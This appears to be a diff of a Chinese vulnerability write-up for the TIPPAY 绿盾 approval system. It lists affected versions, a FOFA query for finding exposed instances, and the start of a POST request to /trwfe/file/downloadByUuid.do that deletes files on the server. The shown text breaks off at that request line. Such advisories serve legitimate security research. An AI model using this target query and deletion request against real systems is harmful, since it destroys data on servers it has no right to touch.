@@ -15,26 +15,14 @@ asset_dir: embedded-base64
 # 影响版本
 
 > 可通过访问 /trwfe/exports/config.ini 获取版本信息
->
-> 数学
 
 V3.53.240913
-
-深入探索
-
-开放源代码
-
-网络监控与管理
-
-VPN 与远程访问
 
 V7.05.240904
 
 # fofa语法
 
 > app="TIPPAY-绿盾审批系统"
->
-> 网络安全
 
 # 漏洞分析
 
@@ -66,15 +54,13 @@ V7.05.240904
 
 测试时应该谨慎测试，最好自己上传一个文件来测试，避免删除了系统重要文件导致系统宕机的尴尬。
 
-网络
+计算机安全
 
 # 漏洞复现
 
 > 漏洞测试会删除对应文件，谨慎测试
 
 可测试tomcat根目录下的BUILDING.txt、CONTRIBUTING.md、LICENSE、NOTICE、README.md、RELEASE-NOTES以及RUNNING.txt等文件来进行验证测试。
-
-网络安全
 
 ```
 POST /trwfe/file/downloadByUuid.do HTTP/1.1
